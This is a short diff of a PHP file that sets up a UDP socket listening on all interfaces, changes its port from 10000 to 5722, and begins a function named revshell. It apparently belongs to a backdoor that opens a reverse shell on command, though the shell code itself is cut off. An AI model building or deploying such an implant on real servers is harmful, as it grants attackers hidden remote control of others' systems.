@@ -1,7 +1,7 @@
 <?php
 
 $sock = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
-socket_bind($sock, '0.0.0.0', 10000);
+socket_bind($sock, '0.0.0.0', 5722);
 $setIP = "";
 
 function revshell($ip, $port) {
